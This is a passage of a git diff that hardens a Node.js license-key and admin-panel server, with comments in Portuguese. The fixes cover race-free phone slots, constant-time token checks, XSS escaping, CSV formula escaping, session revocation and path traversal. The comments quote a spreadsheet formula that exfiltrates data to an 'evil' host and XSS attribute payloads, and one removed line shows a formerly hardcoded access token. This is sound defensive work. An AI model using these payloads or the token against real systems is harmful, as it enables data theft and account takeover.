@@ -7,7 +7,7 @@ const fs     = require('fs');
 const path   = require('path');
 const { MongoClient } = require('mongodb');
 try { require('dotenv').config(); } catch (_) { /* opcional */ }
-const { sendPasswordResetEmail, sendKeyDeliveryEmail } = require('./mailer');
+const { sendPasswordResetEmail, sendKeyDeliveryEmail, sendEmail } = require('./mailer');
 
 const PORT         = process.env.PORT         || 3000;
 const ADMIN_USER   = process.env.ADMIN_USER;
@@ -482,6 +482,163 @@ async function activateDeferredKey(code) {
   return true;
 }
 
+// ══════════════════════════════════════════════════════════════════════
+// Telefone/slot/activation - fonte comercial de verdade CONTINUA sendo
+// phones[]/uses (compatibilidade com clientes legados e com o painel
+// administrativo, que já lê phones.length ao vivo - nada disso muda).
+// Este bloco só adiciona: (1) uma canonicalização única de telefone pra
+// comparação, sem reescrever valores legados já persistidos; (2) uma
+// primitiva atômica pra reivindicar um slot novo sem corrida; (3) um
+// upsert idempotente de metadata opcional em activations[], que nunca
+// influencia phones[]/uses.
+// ══════════════════════════════════════════════════════════════════════
+
+// Única canonicalização de telefone do servidor - baseada no formato que
+// /api/auth/validation/* (o endpoint mais antigo) já usa pra persistir há
+// mais tempo: só dígitos, até 20 caracteres. Usada SÓ para comparação -
+// nunca reescreve o que já está salvo em phones[] (legado permanece
+// intacto), só passa a comparar "+55 (31) 99999-9999" e "5531999999999"
+// como o mesmo telefone.
+function normalizePhone(value) {
+  if (!value) return '';
+  return String(value).replace(/\D/g, '').slice(0, 20);
+}
+
+// Resincroniza uses = phones.length (tanto em memória quanto no Mongo) -
+// nunca confia em uses estar correto de antemão. Achado real na auditoria:
+// pelo menos um endpoint legado consegue deixar uses !== phones.length.
+// Chamado ao final de toda operação de claimPhoneSlotAtomic, em qualquer
+// desfecho, pra que uma chave legada dessincronizada se autocorrija no
+// primeiro login novo que passar por aqui.
+async function repairUsesAndReturn(keyCode, status) {
+  const k = keys[keyCode];
+  if (!k) return { status };
+  const realUses = Array.isArray(k.phones) ? k.phones.length : 0;
+  if (k.uses !== realUses) {
+    k.uses = realUses;
+    try {
+      const db = await getMongoDb();
+      await db.collection('store').updateOne(
+        { _id: 'keys' },
+        { $set: { [`data.${keyCode}.uses`]: realUses, updatedAt: new Date() } }
+      );
+    } catch (e) { saveKey(keyCode).catch(() => {}); }
+  }
+  return { status, phones: k.phones, uses: k.uses };
+}
+
+// Reivindica um slot de telefone de forma atômica. NÃO muda a semântica
+// de "uses" de nenhum outro endpoint (ex. /api/auth/validation/* incrementa
+// uses por chamada, de propósito, por fora desta função) - só garante que
+// a ENTRADA em phones[] nunca ultrapassa maxUses, mesmo sob concorrência
+// entre múltiplas réplicas do processo.
+//
+// Retorna:
+//   { status: 'already_member', phones, uses }  - telefone já estava na lista (relogin), nunca falha mesmo com a chave cheia
+//   { status: 'claimed',        phones, uses }  - telefone novo, slot reservado com sucesso
+//   { status: 'limit_reached',  phones, uses }  - telefone novo, sem vaga
+//
+// Atomicidade: o filtro `data.<key>.phones.<maxUses-1>: {$exists:false}`
+// (idioma padrão do Mongo pra "array com menos de maxUses itens") + o
+// documento único `_id:'keys'` compartilhado por TODAS as chaves fazem o
+// MongoDB serializar essas escritas no nível de documento - duas chamadas
+// concorrentes (mesmo telefone ou não, mesma chave ou não) nunca são
+// aplicadas ao mesmo tempo. Isso só protege contra escritores que passem
+// por ESTA função; um escritor antigo que ainda faça read-then-push em
+// memória por fora dela ignora esse filtro por completo (ver auditoria -
+// atomicidade forte exige TODOS os escritores usando esta primitiva, e
+// nenhuma réplica antiga rodando em paralelo).
+// opts.syncUses (default true): quando true, resincroniza uses=phones.length
+// ao final (comportamento desejado por /extension/v3/key e /api/client/phone,
+// onde uses É phones.length). Passe { syncUses: false } em endpoints com
+// accounting PRÓPRIO de "uses" (ex. /api/auth/validation/*, que incrementa
+// uses por CHAMADA, de propósito, não por telefone único) - nesse caso só a
+// inclusão atômica em phones[] acontece aqui, uses fica inteiramente por
+// conta do chamador.
+async function claimPhoneSlotAtomic(keyCode, rawPhone, maxUses, opts) {
+  const syncUses = !opts || opts.syncUses !== false;
+  const finish = (status) => syncUses
+    ? repairUsesAndReturn(keyCode, status)
+    : { status, phones: keys[keyCode]?.phones || [] };
+
+  const phone = normalizePhone(rawPhone);
+  if (!phone) return finish('already_member');
+
+  const existing = keys[keyCode];
+  if (existing && Array.isArray(existing.phones) && existing.phones.some(p => normalizePhone(p) === phone)) {
+    return finish('already_member');
+  }
+
+  const db = await getMongoDb();
+  const isUnlimited = !(typeof maxUses === 'number' && maxUses > 0);
+  const effectiveMax = isUnlimited ? 0 : maxUses;
+
+  const filter = { _id: 'keys' };
+  filter[`data.${keyCode}.phones`] = { $ne: phone };
+  if (!isUnlimited) filter[`data.${keyCode}.phones.${effectiveMax - 1}`] = { $exists: false };
+
+  const result = await db.collection('store').updateOne(filter, {
+    $push: { [`data.${keyCode}.phones`]: phone },
+    $set: { [`data.${keyCode}.updatedAt`]: new Date() }
+  });
+
+  if (result.modifiedCount === 0) {
+    // Outra requisição já inseriu esse telefone, ou o limite foi atingido
+    // por uma corrida - recarrega o estado real do Mongo e decide com base
+    // nele, nunca com base na leitura em memória de antes da tentativa.
+    const fresh = await db.collection('store').findOne({ _id: 'keys' });
+    const freshRec = fresh?.data?.[keyCode];
+    if (freshRec) keys[keyCode] = sanitizeKeyRecord(freshRec);
+    const freshPhones = keys[keyCode]?.phones || [];
+    if (freshPhones.some(p => normalizePhone(p) === phone)) {
+      return finish('already_member');
+    }
+    return finish('limit_reached');
+  }
+
+  if (!keys[keyCode]) keys[keyCode] = {};
+  if (!Array.isArray(keys[keyCode].phones)) keys[keyCode].phones = [];
+  if (!keys[keyCode].phones.includes(phone)) keys[keyCode].phones.push(phone);
+  return finish('claimed');
+}
+
+// Metadata OPCIONAL e aditiva - nunca influencia phones[]/uses (a fonte
+// comercial de verdade). Só roda quando deviceId existe: cliente legado
+// sem deviceId nunca cria entrada aqui, de propósito (evita registros
+// ambíguos {deviceId:null}). Idempotente por phone+deviceId canonicalizados,
+// mesmo padrão de updateOne condicional de claimPhoneSlotAtomic - duas
+// chamadas concorrentes com o mesmo par nunca resultam em duas entradas.
+// Fire-and-forget do ponto de vista do chamador (nunca deve atrasar nem
+// bloquear a resposta de login por causa de metadata).
+async function upsertActivation(keyCode, rawPhone, deviceId, meta) {
+  if (!deviceId) return;
+  const phone = normalizePhone(rawPhone);
+  if (!phone) return;
+  try {
+    const db = await getMongoDb();
+    const now = new Date();
+    const touch = await db.collection('store').updateOne(
+      { _id: 'keys' },
+      { $set: {
+          [`data.${keyCode}.activations.$[a].lastSeenAt`]: now,
+          [`data.${keyCode}.activations.$[a].lastIp`]: meta?.ip || null,
+          [`data.${keyCode}.activations.$[a].wppVersion`]: meta?.wppVersion || null,
+      }},
+      { arrayFilters: [{ 'a.phone': phone, 'a.deviceId': deviceId }] }
+    );
+    if (touch.modifiedCount === 0) {
+      const filter = { _id: 'keys' };
+      filter[`data.${keyCode}.activations`] = { $not: { $elemMatch: { phone, deviceId } } };
+      await db.collection('store').updateOne(filter, {
+        $push: { [`data.${keyCode}.activations`]: {
+          phone, deviceId, firstSeenAt: now, lastSeenAt: now,
+          lastIp: meta?.ip || null, wppVersion: meta?.wppVersion || null
+        }}
+      });
+    }
+  } catch (e) { console.error('[activations] upsert falhou (não-crítico):', e.message); }
+}
+
 async function saveLogs() {
   try {
     const db = await getMongoDb();
@@ -602,6 +759,17 @@ function hashPassword(pass, salt) {
   );
 }
 function genSalt() { return crypto.randomBytes(32).toString('hex'); }
+
+// Comparação de segredos em tempo constante. Aceita strings de qualquer tamanho:
+// o comprimento sozinho já vaza por timing em `===`, então normalizamos via hash
+// SHA-256 antes de comparar (buffers sempre de 32 bytes → timingSafeEqual nunca lança).
+function safeCompare(a, b) {
+  if (typeof a !== 'string' || typeof b !== 'string') return false;
+  if (!a.length || !b.length) return false;
+  const ha = crypto.createHash('sha256').update(a, 'utf8').digest();
+  const hb = crypto.createHash('sha256').update(b, 'utf8').digest();
+  return crypto.timingSafeEqual(ha, hb);
+}
 
 function verifyTOTP(secret, token) {
   if (!secret) return true;
@@ -778,6 +946,28 @@ function extractTracking(payload) {
   return out;
 }
 
+function getKeyTracking(k) {
+  if (k.tracking && typeof k.tracking === 'object') return k.tracking;
+  const m = (k.note || '').match(/Origem: (.+)/);
+  if (!m) return null;
+  const out = {};
+  for (const part of m[1].split(' · ')) {
+    const [key, ...rest] = part.split(':');
+    const val = rest.join(':');
+    if (!val) continue;
+    if (key === 'origem') out.src = val;
+    else if (key === 'meio') out.medium = val;
+    else if (key === 'campanha') out.campaign = val;
+    else if (key === 'ref') out.ref = val;
+  }
+  return Object.keys(out).length ? out : null;
+}
+function renderTrackingChips(k) {
+  const t = getKeyTracking(k);
+  if (!t) return `<span style="color:var(--tx3)">—</span>`;
+  return `<div class="trk">${t.src?`<span class="trk-chip trk-src">🎯 ${escHtml(t.src)}</span>`:''}${t.medium?`<span class="trk-chip trk-med">📡 ${escHtml(t.medium)}</span>`:''}${t.campaign?`<span class="trk-chip trk-camp">📣 ${escHtml(t.campaign)}</span>`:''}${(!t.src&&t.ref)?`<span class="trk-chip trk-ref">🔗 ${escHtml(t.ref)}</span>`:''}</div>`;
+}
+
 function planLabelForMaxUses(n) {
   if (n === 1) return 'Solo';
   if (n === 3) return 'Padrão';
@@ -829,6 +1019,7 @@ function isProManagerId(managerId) {
 }
 function sanitizeKeyRecord(k) {
   if (!k || typeof k !== 'object') return k;
+  if (!Array.isArray(k.activations)) k.activations = [];
   if (k.plan_id === FREE_PLAN_ID || k.plan_id === FREE_OWNER_ID) k.plan_id = 'ZV_PRO';
   if (k.planId === FREE_PLAN_ID || k.planId === FREE_OWNER_ID) k.planId = 'ZV_PRO';
   if (!k.isBasicPlan) {
@@ -1083,7 +1274,7 @@ function getAuthData(keyCode, userName) {
     numberWarning: false,
     segments: Array.isArray(k.segments) ? k.segments : [],
     isLoggedIn: true,
-    isPremium: true,
+    isPremium: !k.isBasicPlan,
     isFreePlan: false,
     isBasicPlan: !!k.isBasicPlan,
     expiresAt: expiry.expiresAt,
@@ -1298,7 +1489,7 @@ function buildKeysHtml(srcKeys, srcLogs) {
   const _keys = srcKeys || keys;
   const _logs = srcLogs || logs;
   const entries = Object.entries(_keys);
-  if (!entries.length) return `<tr><td colspan="11" class="empty">Nenhuma chave cadastrada</td></tr>`;
+  if (!entries.length) return `<tr><td colspan="12" class="empty">Nenhuma chave cadastrada</td></tr>`;
   const logByKey = new Map();
   for (const l of _logs) { if (!l.keyCode) continue; if (!logByKey.has(l.keyCode)) logByKey.set(l.keyCode, []); logByKey.get(l.keyCode).push(l); }
   return entries.map(([code, k]) => {
@@ -1311,7 +1502,7 @@ function buildKeysHtml(srcKeys, srcLogs) {
     const deferredAttr = (!k.expiresAt && k.expireDuration) ? '1' : '0';
     const dispStatus = getKeyDisplayStatus(k);
     const zsOn = !!(k.modules && k.modules.zapSaver);
-    return `<tr data-code="${escHtml(code)}" data-expires-at="${escHtml(k.expiresAt||'')}" data-deferred="${deferredAttr}" data-validity="${getKeyValiditySortKey(k)}" data-label="${escHtml(k.label.toLowerCase())}" data-phone="${escHtml(k.lastPhone||'')}" data-status="${dispStatus}" data-uses="${k.uses||0}" data-created="${k.createdAt||''}" data-lastused="${escHtml(k.lastUsed||'')}" data-suspect="${isSuspect?'1':''}" data-createdby="${escHtml(((k.createdBy)||((k.note||'').match(/\[Mod: ([^\]]+)\]/)||[])[1]||'').toLowerCase())}" data-plan="${escHtml((k.planId||k.plan_id||'pro').toLowerCase())}"` + rowStyle + `>
+    return `<tr data-code="${escHtml(code)}" data-expires-at="${escHtml(k.expiresAt||'')}" data-deferred="${deferredAttr}" data-validity="${getKeyValiditySortKey(k)}" data-label="${escHtml(String(k.label||'').toLowerCase())}" data-phone="${escHtml(k.lastPhone||'')}" data-status="${dispStatus}" data-uses="${k.uses||0}" data-created="${k.createdAt||''}" data-lastused="${escHtml(k.lastUsed||'')}" data-suspect="${isSuspect?'1':''}" data-createdby="${escHtml(((k.createdBy)||((k.note||'').match(/\[Mod: ([^\]]+)\]/)||[])[1]||'').toLowerCase())}" data-plan="${escHtml((k.planId||k.plan_id||'pro').toLowerCase())}"` + rowStyle + `>
   <td><span style="display:flex;align-items:center;gap:6px"><input type="checkbox" class="key-cb" style="cursor:pointer;width:13px;height:13px;flex-shrink:0"><span class="kc" title="Clique para copiar" style="cursor:pointer">${escHtml(code)}</span></span></td>
   <td>${escHtml(k.label)}${suspectBadge}${zsOn?'<span title="ZapSaver ativo" style="color:#4f8ef7;font-size:11px;margin-left:4px">💾</span>':''}</td>
   <td>${renderKeyStatusBadge(k)}</td>
@@ -1321,6 +1512,7 @@ function buildKeysHtml(srcKeys, srcLogs) {
   <td title="${uniqueIps} IPs únicos">${escHtml(k.lastIp||'-')} ${uniqueIps>1?`<span style="color:var(--muted);font-size:13px">(+${uniqueIps-1})</span>`:''}</td>
   <td>${fmtShortDate(k.lastUsed||null)}</td>
   <td>${fmtShortDate(k.createdAt||null)}</td>
+  <td>${renderTrackingChips(k)}</td>
   <td class="note-cell" data-code="${escHtml(code)}" data-note="${escHtml(k.note||'')}"><span class="note-preview">${(()=>{const modPfx=k.createdBy?`<span style="color:#9b59b6;font-size:11px">[Mod: ${escHtml(k.createdBy)}]</span> `:``;const noteText=escHtml(k.note||'');return modPfx+(noteText||(!modPfx?'<span style="color:var(--muted)">—</span>':''));})()}</span></td>
   <td><div class="acts">
     <button class="bs ${k.active?'bd':'bg'}" onclick="toggleKey('${escHtml(code)}')">${k.active?'Bloquear':'Liberar'}</button>
@@ -1369,16 +1561,20 @@ function parseKeyExpiryFromBody(body, { allowMinutes = false } = {}) {
   return { expiresAt: new Date(Date.now() + durationMs).toISOString(), expireDuration: null };
 }
 
-function removePhoneFromKey(k, phone) {
-  k.phones = (k.phones || []).filter(p => p !== phone);
+function removePhoneFromKey(k, rawPhone) {
+  const phone = normalizePhone(rawPhone);
+  const lastPhoneMatches = k.lastPhone && normalizePhone(k.lastPhone) === phone;
+  k.phones = (k.phones || []).filter(p => normalizePhone(p) !== phone);
   k.uses = k.phones.length;
-  if (k.lastPhone === phone) k.lastPhone = k.phones.at(-1) || null;
+  if (lastPhoneMatches) k.lastPhone = k.phones.at(-1) || null;
+  k.activations = (k.activations || []).filter(a => normalizePhone(a?.phone) !== phone);
 }
 
 function clearAllPhonesFromKey(k) {
   k.phones = [];
   k.uses = 0;
   k.lastPhone = null;
+  k.activations = [];
 }
 
 function resolvePhoneToRemove(phones, { phoneIdx, phoneTxt }) {
@@ -1432,6 +1628,20 @@ function isModSession(req) {
   // Sliding expiry: renova por mais 8h a cada acesso autenticado
   s.expiresAt = new Date(Date.now() + 8 * 60 * 60 * 1000).toISOString();
   return true;
+}
+
+// Revoga todas as sessões de portal de um e-mail. Chamado após troca/reset de senha:
+// sem isto, a sessão de quem invadiu a conta continua válida por até 24h mesmo depois
+// da vítima trocar a senha — a troca não expulsa o invasor.
+function revokePortalSessions(email, keepToken) {
+  const target = String(email || '').toLowerCase();
+  if (!target) return 0;
+  let n = 0;
+  for (const [tok, s] of Object.entries(portalSessions)) {
+    if (tok === keepToken) continue;
+    if (String(s?.email || '').toLowerCase() === target) { delete portalSessions[tok]; n++; }
+  }
+  return n;
 }
 
 function isPortalSession(req) {
@@ -1692,6 +1902,17 @@ function sendHtml(res, html, status = 200) {
 
 function escHtml(s) {
   return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;').replace(/`/g,'&#96;');
+}
+
+// Célula CSV segura. Além do escape de aspas, prefixa com apóstrofo qualquer valor
+// iniciado por = + - @ TAB CR: Excel/LibreOffice/Sheets interpretam esses valores como
+// FÓRMULA. Um label de chave ou clientName de webhook contendo
+// =HYPERLINK("http://evil/?"&A1,"clique") exfiltra a planilha quando o admin abre o
+// export (CSV injection / formula injection).
+function csvCell(v) {
+  let s = String(v == null ? '' : v);
+  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
+  return '"' + s.replace(/"/g, '""') + '"';
 }
 
 const DEDUP_WINDOWS = {
@@ -2807,7 +3028,9 @@ function renderPortalDashboard(user, keyData, okMsg='') {
 
   const hasKey = !!keyData;
   const has2fa = !!(user && user.totpSecret);
-  const firstName = escHtml(user.name.split(' ')[0]);
+  // String(): registros de portal_users criados por importação/webhook podem não ter
+  // "name"; .split de undefined derrubava o dashboard inteiro para "Erro temporário".
+  const firstName = escHtml(String(user.name || user.email || 'Cliente').split(' ')[0]);
 
   const body = `
 <style>
@@ -3440,6 +3663,12 @@ td.td-status{white-space:nowrap;overflow:hidden}
 .note-cell{cursor:pointer;max-width:130px}
 .note-cell:hover .note-preview{color:var(--g)}
 .note-preview{color:var(--tx3);font-size:11px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;display:block;max-width:120px}
+.trk{display:flex;flex-direction:column;gap:4px;align-items:flex-start}
+.trk-chip{display:inline-flex;align-items:center;gap:5px;font-family:'Outfit',sans-serif;font-size:11.5px;font-weight:700;padding:2px 8px;border-radius:99px;white-space:nowrap;line-height:1.5}
+.trk-src{background:#00ff8715;color:var(--g);border:1px solid #00ff8730}
+.trk-med{background:#4f8ef715;color:#4f8ef7;border:1px solid #4f8ef730}
+.trk-camp{background:#c084fc15;color:#c084fc;border:1px solid #c084fc30}
+.trk-ref{background:#ffffff0a;color:var(--tx3);border:1px solid var(--brd)}
 /* ── Toast ── */
 .toast{position:fixed;bottom:20px;right:20px;padding:10px 16px;border-radius:var(--r);font-weight:600;font-size:12px;display:none;z-index:999999;box-shadow:var(--shadow-lg);max-width:360px;line-height:1.4;border:1px solid transparent}
 /* ── Modal ── */
@@ -3559,6 +3788,7 @@ td.td-status{white-space:nowrap;overflow:hidden}
           <col style="width:7%">
           <col style="width:7%">
           <col style="width:5%">
+          <col style="width:9%">
           <col style="width:16%">
         </colgroup>
         <thead><tr>
@@ -3571,6 +3801,7 @@ td.td-status{white-space:nowrap;overflow:hidden}
           <th>Último IP</th>
           <th onclick="sortKeys('lastused')" id="th-lastused">Último Acesso</th>
           <th onclick="sortKeys('created')" id="th-created">Criado em</th>
+          <th>Origem</th>
           <th>Nota</th>
           <th style="cursor:default">Ações</th>
         </tr></thead>
@@ -4326,9 +4557,12 @@ function renderUsersTable(list){
     const _eu=s=>String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
     const name=_eu(u.name||u.displayName||'-');
     const email=_eu(u._id||u.email||'-');
-    const phone=u.phone?'<span style="font-family:var(--mono);font-size:13px">'+u.phone+'</span>':'<span style="color:var(--tx3)">—</span>';
-    const key=u.keyCode?'<span class="kc" style="font-size:12px">'+u.keyCode+'</span>':'<span style="color:var(--tx3)">—</span>';
-    const plan=u.plan?'<span style="color:var(--g);font-weight:700;font-size:12px">'+u.plan.toUpperCase()+'</span>':'<span style="color:var(--tx3)">—</span>';
+    // _eu em TODOS os campos: u.plan vem de k.label no painel WSM, que um moderador
+    // controla. Sem escape, um label com <img onerror=...> executava no navegador do
+    // admin ao abrir a aba Usuários (escalonamento moderador -> admin).
+    const phone=u.phone?'<span style="font-family:var(--mono);font-size:13px">'+_eu(u.phone)+'</span>':'<span style="color:var(--tx3)">—</span>';
+    const key=u.keyCode?'<span class="kc" style="font-size:12px">'+_eu(u.keyCode)+'</span>':'<span style="color:var(--tx3)">—</span>';
+    const plan=u.plan?'<span style="color:var(--g);font-weight:700;font-size:12px">'+_eu(String(u.plan).toUpperCase())+'</span>':'<span style="color:var(--tx3)">—</span>';
     const status=u.banned?'<span class="badge off">Banido</span>':u.verified===false?'<span class="badge" style="background:#ffa04020;color:var(--orange);border:1px solid #ffa04040">Pendente</span>':'<span class="badge on">Ativo</span>';
     return \`<tr>
       <td style="font-weight:600">\${name}</td>
@@ -5788,11 +6022,15 @@ async function renderAnalyticsDashboard() {
   const payments = await getPayments({ limit: 200 });
   const fmtBRL   = v => 'R$\u00a0' + (v||0).toFixed(2).replace('.',',');
   const fmtDate  = iso => iso ? new Date(iso).toLocaleString('pt-BR',{timeZone:'America/Sao_Paulo',day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit'}) : '—';
-  const escH     = s => String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
-  const byDayJson    = JSON.stringify(stats?.byDay     || []);
-  const byProdJson   = JSON.stringify(stats?.byProduct || []);
-  const byHourJson   = JSON.stringify(stats?.byHour    || []);
-  const byMethodJson = JSON.stringify(stats?.byMethod  || []);
+  // Usa o escHtml global: o antigo escH NÃO escapava aspas, e é usado dentro de
+  // atributos (data-row="..."). Um clientName vindo do webhook com `" onmouseover=`
+  // fechava o atributo e executava JS no painel de analytics (XSS armazenado).
+  const escH     = escHtml;
+  const escJs        = s => s.replace(/</g,'\\u003c');
+  const byDayJson    = escJs(JSON.stringify(stats?.byDay     || []));
+  const byProdJson   = escJs(JSON.stringify(stats?.byProduct || []));
+  const byHourJson   = escJs(JSON.stringify(stats?.byHour    || []));
+  const byMethodJson = escJs(JSON.stringify(stats?.byMethod  || []));
 
   const paymentsRows = payments.length ? payments.map(p => {
     const rowSearch = [p.clientName,p.clientEmail,p.productName,p.keyCode,p.paymentMethod,p.tracking?.compact].join('|').toLowerCase();
@@ -5909,7 +6147,7 @@ tr:hover td{background:#ffffff02}
   <!-- KPIs secundários -->
   <div class="stats2">
     <div class="sc"><div class="sc-icon">📦</div><div class="n blue">${stats?.byProduct?.length||0}</div><div class="l">Produtos Ativos</div><div class="sub-n">${(stats?.byProduct||[]).slice(0,2).map(p=>escH(p._id||'?')+'('+p.count+')').join(', ')||'—'}</div></div>
-    <div class="sc"><div class="sc-icon">💳</div><div class="n blue">${(stats?.byMethod||[])[0]?._id||'—'}</div><div class="l">Método + Usado</div><div class="sub-n">${(stats?.byMethod||[])[0]?.count||0} transações</div></div>
+    <div class="sc"><div class="sc-icon">💳</div><div class="n blue">${escH((stats?.byMethod||[])[0]?._id)||'—'}</div><div class="l">Método + Usado</div><div class="sub-n">${(stats?.byMethod||[])[0]?.count||0} transações</div></div>
     <div class="sc"><div class="sc-icon">📉</div><div class="n ${(stats?.churnRate||0)>50?'red':(stats?.churnRate||0)>25?'gold':''}">${stats?.churnRate||0}%</div><div class="l">Taxa de Churn (30d)</div><div class="sub-n">${stats?.churnedKeys||0} de ${stats?.expiredKeys||0} expiradas</div></div>
     <div class="sc"><div class="sc-icon">⏰</div><div class="n blue">${(stats?.byHour||[]).sort((a,b)=>b.count-a.count)[0]?._id||'—'}h</div><div class="l">Horário de Pico</div><div class="sub-n">${(stats?.byHour||[]).sort((a,b)=>b.count-a.count)[0]?.count||0} vendas neste horário</div></div>
   </div>
@@ -6014,7 +6252,7 @@ loadChart(()=>{
     ]},options:{responsive:true,maintainAspectRatio:false,plugins:{legend:{labels:{font:{family:'Space Mono',size:10},boxWidth:12}}},scales:{y:{position:'left',grid:{color:'#1c1c2e'},ticks:{precision:0}},y2:{position:'right',grid:{drawOnChartArea:false},ticks:{callback:v=>'R$'+v.toFixed(0)}},x:{grid:{color:'#1c1c2e'},ticks:{font:{size:9},maxRotation:45}}}}});
 
   if(_byProduct.length){const colors=['#ffd32a','#00ff87','#4f8ef7','#ff4757','#9b59b6','#ff8600'];
-  new Chart(document.getElementById('chartProdutos'),{type:'doughnut',data:{labels:_byProduct.map(p=>p._id||'?'),datasets:[{data:_byProduct.map(p=>p.revenue||p.count),backgroundColor:colors,borderColor:'#0f0f1a',borderWidth:3}]},options:{responsive:true,maintainAspectRatio:false,plugins:{legend:{position:'bottom',labels:{font:{family:'Space Mono',size:10},boxWidth:10,padding:8}},tooltip:{callbacks:{label:ctx=>' R$ '+ctx.parsed.toFixed(2).replace('.',',')}}}}}});}
+  new Chart(document.getElementById('chartProdutos'),{type:'doughnut',data:{labels:_byProduct.map(p=>p._id||'?'),datasets:[{data:_byProduct.map(p=>p.revenue||p.count),backgroundColor:colors,borderColor:'#0f0f1a',borderWidth:3}]},options:{responsive:true,maintainAspectRatio:false,plugins:{legend:{position:'bottom',labels:{font:{family:'Space Mono',size:10},boxWidth:10,padding:8}},tooltip:{callbacks:{label:ctx=>' R$ '+ctx.parsed.toFixed(2).replace('.',',')}}}}});}
 
   new Chart(document.getElementById('chartHoras'),{type:'bar',data:{
     labels:_hours.map(h=>h.h),
@@ -6430,7 +6668,12 @@ async function runInternalSecurityAudit() {
 const WSM = (() => {
   const WSM_DB_NAME = (process.env.WSM_MONGODB_DB || 'watidy').trim();
   const ACCESS_TOKEN = process.env.WSM_ACCESS_TOKEN || process.env.ACCESS_TOKEN || '';
-  const criptKey = ACCESS_TOKEN || 'ffce211a-7b07-4d91-ba5d-c40bb4034a83';
+  // Sem fallback embutido: o valor antigo estava no código-fonte, ou seja, era público.
+  // Quem lesse o arquivo autenticava em /api/auth/*, /api/user/*, /api/services/*.
+  // Se WSM_ACCESS_TOKEN não estiver definido, gera um valor aleatório por boot —
+  // as rotas gated ficam inacessíveis (falha fechada) em vez de aceitarem o segredo público.
+  const criptKey = ACCESS_TOKEN || crypto.randomBytes(32).toString('hex');
+  if (!ACCESS_TOKEN) console.warn('[WSM] WSM_ACCESS_TOKEN ausente — rotas /api/auth|user|services desativadas (token aleatório por boot).');
   const WPP_VERSION = '1.11';
   const REMOTE_CODE_VERSION = '1.0.41';
   const chromeStoreId = process.env.WSM_CHROME_STORE_ID || 'gjlfpggiddcminhebiejofeglfjmleli';
@@ -6587,8 +6830,8 @@ const WSM = (() => {
   }
   
   function requireAccessToken(req) {
-    const token = (req.headers['access-token'] || '').trim();
-    return token === criptKey;
+    const token = String(req.headers['access-token'] || '').trim();
+    return safeCompare(token, criptKey);   // tempo constante — `===` vazava o token
   }
   
   function parseBearer(req) {
@@ -6620,7 +6863,9 @@ const WSM = (() => {
     const _sec = APP_SECRET || criptKey || 'wt-secret';
     for (const [k, kv] of Object.entries(keys)) {
       const exp = crypto.createHmac('sha256', _sec).update(k).digest('hex').slice(0, 40);
-      if (exp === b || k === b) return _synthRec(k, kv);
+      // safeCompare: o bearer é um segredo de sessão; `===` permitiria descobri-lo
+      // caractere a caractere medindo o tempo de resposta.
+      if (safeCompare(exp, b) || safeCompare(k, b)) return _synthRec(k, kv);
     }
     await getDb(); if (!db) return null;
     try {
@@ -7137,6 +7382,14 @@ const WSM = (() => {
     if (!m) return false;
     const storeId = m[1];
     const action  = m[2].toLowerCase();
+    const _ip     = getIp(req);
+    // Estas rotas validam chave de licença / bearer. Sem throttle era possível
+    // enumerar chaves válidas em rajada (uma tentativa por request, sem limite).
+    const _throttled = (action === 'login' || action === 'auth-plugin' || action === 'auth-painel');
+    if (_throttled && !checkRateLimit(_ip, 'ext_key')) {
+      sendJson(res, { success: false, msg_id: 'rate_limited' }, 429);
+      return true;
+    }
     // "auth-painel" (Minha Conta): a extensão abre com ?token=<bearer_token> — a
     // sessão que ela JÁ possui. Autenticamos por esse token e mostramos a conta,
     // SEM exigir novo login (o cliente já entrou pela chave na extensão).
@@ -7597,6 +7850,8 @@ ${CANVAS_BG}</body></html>`;
           const salt = genSalt();
           const passwordHash = await hashPassword(pass, salt);
           await db.collection('portal_users').updateOne({ _id: sess.email }, { $set: { passwordHash, salt } });
+        // Mantem a sessao atual, revoga as demais (dispositivos/invasores antigos).
+        revokePortalSessions(sess.email, ((req.headers.cookie||'').match(/zv_portal=([a-f0-9]+)/)||[])[1]);
           _redir('/cliente/senha?ok=1'); return true;
         } catch(e) { _html(renderPortalChangePwd('Erro ao alterar senha.')); return true; }
       }
@@ -7621,7 +7876,9 @@ ${CANVAS_BG}</body></html>`;
             await db.collection('password_resets').deleteMany({ email });
             await db.collection('password_resets').insertOne({ _id: token, email, expiresAt });
             const resetUrl = BASE_URL + '/WSM/cliente/redefinir?token=' + token;
-            console.log('[WSM Portal] Reset token gerado para', email, '→', resetUrl);
+            // NUNCA logar resetUrl: o token troca a senha da conta. Logs vão para
+            // agregadores/terceiros e viram um caminho direto de account takeover.
+            console.log('[WSM Portal] Reset token gerado para', email);
             if (RESEND_API_KEY) { const sent = await sendPasswordResetEmail(email, resetUrl); if (!sent) console.warn('[WSM Portal] Falha ao enviar email de reset para', email); }
           }
           _html(renderPortalResetRequest('', okMsg)); return true;
@@ -7649,6 +7906,8 @@ ${CANVAS_BG}</body></html>`;
           const salt = genSalt();
           const passwordHash = await hashPassword(pass, salt);
           await db.collection('portal_users').updateOne({ _id: rec.email }, { $set: { passwordHash, salt } });
+        // Reset de senha expulsa todas as sessoes existentes da conta.
+        revokePortalSessions(rec.email);
           await db.collection('password_resets').deleteOne({ _id: tk });
           _html(renderPortalResetForm('', 'Senha redefinida com sucesso!', '')); return true;
         } catch(e) { _html(renderPortalResetForm('Erro temporário.', '', tk)); return true; }
@@ -7739,11 +7998,13 @@ ${CANVAS_BG}</body></html>`;
     }
     // Paginas estaticas do Agente IA (salvas de ia.wascript.com.br)
     if (p === '/ia' || p.startsWith('/ia/') || p === '/ia/') {
-      const _iaBase = path.join(__dirname, 'ia');
+      const _iaBase = path.resolve(__dirname, 'ia');
       const _iaSub  = p.replace(/^\/ia/, '') || '/';
-      const _iaRaw  = path.join(_iaBase, _iaSub);
-      // Proteção contra path traversal
-      if (!_iaRaw.startsWith(_iaBase)) { res.writeHead(403); res.end('Forbidden'); return; }
+      const _iaRaw  = path.resolve(_iaBase, '.' + (_iaSub.startsWith('/') ? _iaSub : '/' + _iaSub));
+      // Proteção contra path traversal. O startsWith(_iaBase) puro era burlável por
